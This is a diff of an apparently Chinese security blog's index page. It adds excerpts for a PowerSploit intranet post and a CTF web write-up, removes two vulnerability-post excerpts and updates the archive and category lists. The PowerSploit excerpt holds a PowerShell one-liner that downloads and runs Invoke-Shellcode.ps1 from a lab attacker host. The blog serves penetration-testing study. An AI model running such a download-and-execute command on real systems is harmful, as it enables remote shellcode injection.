@@ -351,6 +351,67 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2019/04/24/powersploit/" >
+            
+                <span>内网中的PowerSploit</span>
+        </a>
+        <div class="abstract-content">
+            内网中的PowerSploit靶机 Win2008攻击机 Kali
+Powershell下载命令获取补丁
+1Get-WmiObject -Class Win32_QuickFixEngineering
+一句话下载
+1IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.107.1/PS1/Invoke-Shellcode.ps1)
+Shellcode InjectionInvoke-Shellcode.ps1-Shellcode注入
+先在win2008上下载攻击机上的ps脚本
+
+1IEX(New-Object ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/24</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/04/23/全国大学生/" >
+            
+                <span>第12届全国大学生信息安全竞赛Web题解</span>
+        </a>
+        <div class="abstract-content">
+            全国大学生Web1一共三个考点：
+
+parse_url绕过http://lawlietweb.com/2018/05/13/parse_url/
+wakeup绕过https://paper.seebug.org/39/
+随机数（此处两解）
+
+hint.php
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phperror_reporting(E_ALL);class Handle&#123;    private $handle;    /...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/04/22/ddctf/" >
             
                 <span>DDCTF部分 Write up</span>
@@ -571,58 +632,6 @@ Kali(Attacker)NAT和本机互通
             <!-- date  -->
             <div class="abstract-date">
                 <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/22</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/02/20/metinfo_sql/" >
-            
-                <span>Metinfo 6.1.2 SqlInjection</span>
-        </a>
-        <div class="abstract-content">
-            Metinfo 6.1.2 SqlInjection一个18年的洞了，有点年头了，翻出来看看。。
-Sourcehttp://www.mituo.cn/upload/file/MetInfo6.1.2.zip
-漏洞分析直接看到出现问题的代码
-12文件：app/system/message/web/message.class.php：37方法：add
-12345678910111213141516public function add($info) &#123;	global $_M;	if(!$_M[form][id])&#123;          $message=DB::get_on...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/20</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/02/16/redis/" >
-            
-                <span>初识Redis未授权访问</span>
-        </a>
-        <div class="abstract-content">
-            初识Redis未授权访问redis是一种以key-value为键值对的非关系型数据库redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Map), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。
-安装服务win下载地址：https://github.com/MSOpenTech/redis/releases测试环境：
-12操作系统：win7ip：192.168.1...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/16</span>
             </div>
             <!-- tags  -->
             
@@ -2055,9 +2064,57 @@ Sourcehttp://www.mituo.cn/upload/file/MetInfo6.1.2.zip
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 87
+        Total : 89
         </div>
         <!-- search  -->
         
@@ -2070,6 +2127,16 @@ Sourcehttp://www.mituo.cn/upload/file/MetInfo6.1.2.zip
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2019/10/20/joomla/" >Joomla 3.4.6 远程代码执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/weblogic/" >WebLogic-XMLDecoder反序列化分析</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2118,12 +2185,12 @@ Sourcehttp://www.mituo.cn/upload/file/MetInfo6.1.2.zip
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2019/08/24/java安全漏洞入门之 s2-001/" >java安全漏洞入门之 s2-001</a>
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2019/08/24/java安全漏洞入门之 s2-003&s2-005/" >java安全漏洞入门之 s2-003&s2-005</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2019/08/24/java安全漏洞入门之 s2-003&s2-005/" >java安全漏洞入门之 s2-003&s2-005</a>
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2019/08/24/java安全漏洞入门之 s2-001/" >java安全漏洞入门之 s2-001</a>
         </li>
     
     
@@ -2553,39 +2620,39 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
         <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
     
         <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
-        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
+    
+        <span class="sidebar-category-name" data-categories="浏览器安全"><span class="iconfont-archer">&#xe60a;</span>浏览器安全</span>
     
         <span class="sidebar-category-name" data-categories="备忘录"><span class="iconfont-archer">&#xe60a;</span>备忘录</span>
     
         <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
-        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
-    
-        <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
+        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
     
         <span class="sidebar-category-name" data-categories="java安全"><span class="iconfont-archer">&#xe60a;</span>java安全</span>
     
-        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
-    
-        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
-    
-        <span class="sidebar-category-name" data-categories="浏览器安全"><span class="iconfont-archer">&#xe60a;</span>浏览器安全</span>
+        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
     
         <span class="sidebar-category-name" data-categories="CVE-Request"><span class="iconfont-archer">&#xe60a;</span>CVE-Request</span>
     
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
         <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
+    
+        <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
     
         <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
     
-        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
-    
-        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
-    
         <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
         <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
     
